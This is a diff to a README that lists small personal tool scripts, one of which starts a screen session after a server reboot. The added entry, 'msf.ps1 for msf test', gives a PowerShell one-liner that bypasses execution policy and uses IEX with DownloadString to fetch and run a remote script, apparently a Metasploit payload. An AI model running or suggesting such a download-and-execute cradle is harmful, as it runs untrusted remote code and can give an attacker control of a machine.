@@ -15,3 +15,7 @@ tool script to make something easy
 * start_screen.sh  
     start screen session ,when server reboot ,autorun some server script or app ,
     avoid < & > background app , can not observe the terminal output 
+
+* msf.ps1  
+  for msf test
+  powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rayleeafar/tools/master/msf.ps1');"
